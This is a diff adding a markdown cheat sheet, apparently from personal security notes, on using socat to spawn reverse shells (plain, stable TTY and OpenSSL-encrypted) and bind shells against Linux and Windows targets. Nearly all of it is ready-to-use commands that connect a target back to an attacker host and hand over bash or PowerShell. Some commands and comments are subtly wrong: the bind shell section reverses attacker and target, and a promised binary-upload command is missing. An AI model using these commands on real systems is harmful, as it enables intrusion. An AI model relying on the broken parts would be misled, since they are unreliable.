@@ -2,3 +2,85 @@ SOcket CAT is a tool that facilitates data transfer between two bidirectional da
 
 * Can do all of the same things as Netcat
 * Socat shells are usually more stable than netcat shells
+
+![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/Whitespace.png)
+
+# Spawning Shells
+
+## Spawning Reverse Shells
+
+**Basic reverse shell**
+```Bash
+# Spawn a listener on the attacking host
+socat TCP-L:<port_number> -
+
+# Connect to the listener from the target host using Bash 
+socat TCP:<lhost>:<lport> EXEC:"bash -li"
+
+# Connect to the listener from the target host using Windows
+socat TCP:<lhost>:<lport> EXEC:powershell.exe,pipes
+```
+
+**Fully stable Linux tty reverse shell**
+```Bash
+# Spawn a listener on the attacking host
+socat TCP-L:<port_number> FILE:'tty',raw,echo=0
+
+# Connect to the listener from the target host using Bash 
+socat TCP:<lhost>:<lport> EXEC:"bash -li"[,pty,stderr,sigint,setsid,sane]
+
+# Connect to the listener from the target host using Windows
+socat TCP:<lhost>:<lport> EXEC:powershell.exe,pipes
+
+#The target must be a Linux machine and have socat installed, which you can do by uploading a precompiled socat binary with the following command: socat TCP:<lhost>:<lport> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+# 'pty' allocates a pseudoterminal on the target
+# 'stderr' makes sure that any error messages get shown in the shell
+# 'sigint' passes any CTRL + C commands through into the sub-process, allowing us to kill commands inside the shell
+# 'setsid' creates the process in a new session
+# 'sane' stabilises the terminal, attempting to normalise it
+```
+
+Encrypted reverse shell
+```Bash
+# Generate a certificate on the attacking host in order to use encrypted shells
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+
+# Merge the two created files into a single .pem file
+cat shell.key shell.crt > shell.pem
+
+# Set up the reverse shell listener on the attacking machine
+socat OPENSSL-LISTEN:<port_number>,cert=shell.pem,verify=0 - [FILE:'tty',raw,echo=0] 
+#verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognized CA
+
+# Connect back to the listener from the target machine
+socat OPENSSL:<lhost>:<rport>,verify=0 EXEC:/bin/bash
+```
+
+## Spawning Bind Shells
+
+```Bash
+# Spawn a listener on the target host
+socat TCP-L:<port_number> -
+
+# Connect to the listener from the attacking host using Bash 
+socat TCP:<lhost>:<lport> EXEC:"bash -li"
+
+# Connect to the listener from the attacking host using Windows
+socat TCP:<lhost>:<lport> EXEC:powershell.exe,pipes
+```
+
+Encrypted bind shell
+```Bash
+# Generate a certificate on the target host in order to use encrypted shells
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+
+# Merge the two created files into a single .pem file
+cat shell.key shell.crt > shell.pem
+
+# Set up the reverse shell listener on the target machine
+socat OPENSSL-LISTEN:<port_number>,cert=shell.pem,verify=0 -
+#verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognized CA
+
+# Connect back to the listener from the attacking machine
+socat OPENSSL:<lhost>:<lport>,verify=0 EXEC:/bin/bash
+```
